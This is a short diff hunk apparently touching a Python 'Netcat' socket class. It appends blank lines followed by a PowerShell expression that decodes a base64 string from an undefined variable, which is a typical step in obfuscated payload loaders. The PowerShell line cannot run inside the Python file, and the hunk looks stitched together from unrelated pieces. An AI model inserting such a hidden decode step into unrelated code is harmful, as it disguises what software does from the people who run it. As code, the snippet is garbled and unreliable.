@@ -36,3 +36,8 @@ class Netcat:
     def close(self):
 
         self.socket.close()
+
+
+
+
+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($x))
